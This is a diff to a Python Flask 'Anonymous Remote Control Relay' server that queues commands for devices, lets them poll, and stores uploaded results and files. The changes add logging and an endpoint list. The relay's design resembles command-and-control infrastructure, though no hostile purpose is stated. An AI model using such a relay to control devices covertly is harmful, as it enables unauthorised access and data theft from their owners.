@@ -34,7 +34,7 @@ def cleanup_old_data():
             del results_store[k]
         
         if expired:
-            print(f"Cleaned up {len(expired)} expired results")
+            print(f"[CLEANUP] Removed {len(expired)} expired results")
 
 # Start cleanup thread
 cleanup_thread = threading.Thread(target=cleanup_old_data, daemon=True)
@@ -45,8 +45,16 @@ def home():
     return jsonify({
         'status': 'online',
         'service': 'Anonymous Remote Control Relay',
+        'version': '1.0',
         'active_devices': len([d for d, t in device_last_seen.items() 
-                               if datetime.now() - t < DEVICE_TIMEOUT])
+                               if datetime.now() - t < DEVICE_TIMEOUT]),
+        'endpoints': {
+            'post_command': 'POST /command',
+            'get_commands': 'GET /command/<device_id>',
+            'post_result': 'POST /result/<command_id>',
+            'get_result': 'GET /result/<command_id>',
+            'list_devices': 'GET /devices'
+        }
     })
 
 @app.route('/command', methods=['POST'])
@@ -72,6 +80,8 @@ def post_command():
     
     command_queue[device_id].append(command)
     
+    print(f"[COMMAND] Queued {data['action']} for device {device_id[:8]}... (ID: {command_id[:8]}...)")
+    
     return jsonify({
         'success': True,
         'command_id': command_id,
@@ -89,6 +99,8 @@ def get_commands(device_id):
     # Return all pending commands and clear queue
     commands = command_queue[device_id]
     command_queue[device_id] = []
+    
+    print(f"[POLL] Device {device_id[:8]}... fetched {len(commands)} command(s)")
     
     return jsonify({'commands': commands})
 
@@ -113,6 +125,8 @@ def post_result(command_id):
                 'timestamp': datetime.now()
             }
             
+            print(f"[RESULT] File uploaded for command {command_id[:8]}... ({file.filename})")
+            
             return jsonify({'success': True, 'message': 'File uploaded'})
     
     # Handle JSON data
@@ -123,6 +137,9 @@ def post_result(command_id):
             'data': data,
             'timestamp': datetime.now()
         }
+        
+        print(f"[RESULT] Data received for command {command_id[:8]}...")
+        
         return jsonify({'success': True, 'message': 'Result stored'})
     
     return jsonify({'error': 'No data or file provided'}), 400
@@ -135,6 +152,8 @@ def get_result(command_id):
         return jsonify({'error': 'Result not found or expired'}), 404
     
     result = results_store[command_id]
+    
+    print(f"[DOWNLOAD] Result retrieved for command {command_id[:8]}...")
     
     if result['type'] == 'file':
         return send_file(result['file_path'], 
@@ -164,4 +183,5 @@ def health():
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
-    app.run(host='0.0.0.0', port=port)
+    print(f"[STARTUP] Relay server starting on port {port}...")
+    app.run(host='0.0.0.0', port=port, debug=False)
